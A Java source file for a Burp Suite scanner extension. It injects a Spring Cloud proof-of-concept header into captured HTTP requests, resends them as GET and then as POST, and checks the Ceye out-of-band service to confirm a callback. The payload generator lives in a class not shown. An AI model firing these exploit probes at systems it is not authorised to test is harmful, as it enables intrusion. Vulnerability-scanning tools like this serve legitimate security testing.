package burp.ScanFun;

import burp.*;
import burp.Listen.Ceye;

import java.io.PrintWriter;
import java.util.List;

public class SpringCloudScan {


    static PrintWriter stdout;


    public static IHttpRequestResponse CloudScan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers)
    {
        IRequestInfo analyzeRequest = helpers.analyzeRequest(baseRequestResponse);
        List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        String host = baseRequestResponse.getHttpService().getHost();
        String poc=GenPoc.GenSpringCloudPoc(host);
        Ceye ceye = new Ceye();

        String newhost = "cloud"+GenPoc.Makenewhost(host);

        byte[] new_Request;
        String headerst=headers.get(headers.size()-1);
        headers.set(headers.size()-1,poc);
        headers.add(headerst);
        int bodyOffset = analyzeRequest.getBodyOffset();
        byte[] byte_Request = baseRequestResponse.getRequest();
        String request = new String(byte_Request); //byte[] to String
        String body = request.substring(bodyOffset);
        byte[] byte_body = body.getBytes();  //String to byte[]
        new_Request = helpers.buildHttpMessage(headers, byte_body);

        IHttpRequestResponse requestResponse=callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),new_Request);


        if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
            return requestResponse;
        }

        if(headers.get(0).contains("GET")) {
            headers.set(0, headers.get(0).replace("GET", "POST"));
            headerst=headers.get(headers.size()-1);
            headers.set(headers.size()-1,"Content-Type: application/x-www-form-urlencoded");
            headers.add(headerst);
            new_Request = helpers.buildHttpMessage(headers, byte_body);
            requestResponse=callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),new_Request);
            if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                return requestResponse;
            }

        }
        return null;
    }



}
